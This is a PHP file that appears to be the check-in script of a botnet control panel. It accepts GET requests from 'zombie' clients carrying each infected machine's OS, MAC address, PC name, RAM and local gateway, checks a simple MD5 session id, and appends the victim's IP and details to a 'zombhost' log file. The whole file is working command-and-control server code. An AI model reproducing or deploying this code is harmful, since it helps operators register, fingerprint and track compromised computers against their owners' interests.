<?php
include 'config.php';
if ((isset ($_GET['lang']))  and (isset ($_GET['localgateway'])) and (isset($_GET['os'])) and (isset($_GET['macadr'])) and (isset($_GET['archetype'])) and (isset($_GET['pcname'])) and (isset ($_GET['ram'])) and (isset ($_GET['sid']))) {
	if (_calcsid($salt, $url, $_GET['sid'])) {
		$lang = $_GET['lang'];
		$localgateway = $_GET['localgateway'];
		$os = $_GET['os'];
		$macadr = $_GET['macadr'];
		$archetype = $_GET['archetype'];
		$pcname = $_GET['pcname'];
		$ram = $_GET['ram'];
		$ip = $_SERVER['REMOTE_ADDR'];
		$sid = $_GET['sid'];
		_register ($ip, $lang, $localgateway, $os, $macadr, $archetype, $pcname, $ram, $ip, $sid);
		exit;
	}
	else {
		_write_log ($_SERVER['REMOTE_ADDR'], '#2', 'CSRF MDOS attack attempt. (zombie client can not give a bad secure connexion id.)');
		exit;
	}
}
else {
	_write_log ($_SERVER['REMOTE_ADDR'], '#2', 'CSRF MDOS attack attempt. (zombie client can not make any registration error.)');
	exit;
}

function _calcsid($s, $u, $g) {
	$string = ($s.(strrev($u))) ;
	$sidx = md5($string);
	if ($sidx == $g) {
		Return True;
	}
	else {
		Return False;
	}
}

function _write_log($ip, $type, $data) {
$d_date = (date("d"))."/".(date("m"))." ".(date("H")).":".(date("i"));
$s_string = ($d_date.'|'.$type.'|'.$ip.'|'.$data);
file_put_contents ("appdata/rawlog/rawlog.txt", $s_string."\n", FILE_APPEND);
}

function _register ($a, $b, $c, $d, $e, $f, $g, $h, $i, $j) {
$d_string = ($a.'|'.$b.'|'.$c.'|'.$d.'|'.$e.'|'.$f.'|'.$g.'|'.$h.'|'.$i.'|'.$j);
file_put_contents ("appdata/zombhost/totaltrafic/connectdumper.kt", $d_string."\n", FILE_APPEND);
}
?>